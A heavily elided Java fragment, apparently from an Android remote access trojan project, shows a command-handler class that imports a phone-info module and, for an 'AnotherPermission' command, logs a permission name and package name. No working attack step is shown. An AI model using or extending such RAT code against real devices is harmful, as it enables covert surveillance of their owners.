...
import com.je_chen.droidrat_je.rat.modules.appsinfo.getinfo.GetPhoneInfo;
...
public class InfoCommand extends CommandFather {
    ...
    private final GetPhoneInfo getPhoneInfo;
            ...
            switch (rawCommandArray[1]) {
                ...
                case "AnotherPermission":
                    ...
                    Log.d(TAG, "Info AnotherPermission" +
                            "\nanotherPermissionPermissionName: " +
                            anotherPermissionPermissionName +
                            "\nanotherPermissionPackageName: " +
                            anotherPermissionPackageName);
